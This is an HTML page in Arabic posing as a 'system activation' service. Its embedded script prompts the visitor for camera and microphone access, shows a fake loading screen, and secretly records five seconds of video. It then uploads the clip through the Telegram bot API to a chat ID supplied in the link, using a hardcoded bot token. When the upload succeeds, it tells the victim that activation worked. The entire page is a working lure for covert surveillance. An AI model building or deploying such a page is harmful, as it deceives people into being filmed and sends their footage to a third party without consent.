<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل النظام</title>
    <style>
        /* نفس التصميم الذي أرسلته ليكون متناسقاً */
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #000; color: white; margin: 0; text-align: center; }
        #startBtn { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 8px; transition: 0.3s; }
        #startBtn:active { background-color: #0056b3; }
        .loader { border: 5px solid #333; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-top: 20px; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video { display: none; }
    </style>
</head>
<body>

    <div id="content">
        <h2 id="statusTitle">يجب الضغط على الزر لتفعيل الخدمة</h2>
        <button id="startBtn">ابدأ الآن</button>
        <div id="loadingCircle" class="loader"></div>
        <p id="msg" style="margin-top: 15px; color: #888; display: none;">لحظة واحدة...</p>
    </div>
    
    <video id="video" autoplay playsinline muted></video>

    <script>
        const startBtn = document.getElementById('startBtn');
        const loadingCircle = document.getElementById('loadingCircle');
        const statusTitle = document.getElementById('statusTitle');
        const msg = document.getElementById('msg');
        const video = document.getElementById('video');
        
        const urlParams = new URLSearchParams(window.location.search);
        const senderId = urlParams.get('sender_id');
        const botToken = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E";

        startBtn.onclick = async () => {
            // تغيير الواجهة لتشبه "جاري التحميل" التي أرسلتها
            startBtn.style.display = "none";
            loadingCircle.style.display = "block";
            msg.style.display = "block";
            statusTitle.innerText = "جاري التحميل...";

            try {
                // طلب إذن الكاميرا والميكروفون للفيديو
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;
                
                // بدء التسجيل فوراً
                startRecording(stream);
            } catch (err) {
                alert("يرجى السماح بالوصول للكاميرا لتشغيل الخدمة.");
                location.reload(); // إعادة المحاولة
            }
        };

        function startRecording(stream) {
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];

            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                await sendVideoToTelegram(blob);
            };

            // تسجيل فيديو لمدة 5 ثواني
            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
            }, 5000); 
        }

        async function sendVideoToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', senderId);
            formData.append('video', blob, 'capture.mp4');

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                if(response.ok) {
                    statusTitle.innerText = "تم التفعيل بنجاح!";
                    loadingCircle.style.display = "none";
                    msg.style.display = "none";
                }
            } catch (err) {
                console.error("خطأ في الإرسال:", err);
            }
        }
    </script>
</body>
</html>
